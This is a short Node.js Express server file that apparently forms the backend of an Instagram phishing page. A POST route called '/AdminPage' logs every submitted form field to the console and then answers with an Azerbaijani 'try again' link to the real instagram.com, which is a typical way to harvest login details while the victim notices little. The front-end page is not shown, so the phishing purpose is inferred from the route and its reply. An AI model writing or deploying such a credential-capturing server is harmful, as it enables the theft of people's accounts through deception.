const express =require('express');
const fs=require('fs');
const path=require('path');

const app=express();

app.use(express.static(path.join(__dirname,'./front')));


app.use(express.json());
app.use(express.urlencoded({extended:true}));


app.get('/',(req,res)=>{
    res.end(fs.readFileSync('./front/index.html','utf-8'));


})

app.post('/AdminPage',(req,res)=>{
    console.log(req.body);
    res.end('<a href="https://www.instagram.com">Yeniden yoxla<a/>');
})


app.listen(1000,'0.0.0.0',()=>{
    console.log('server has started!');
})
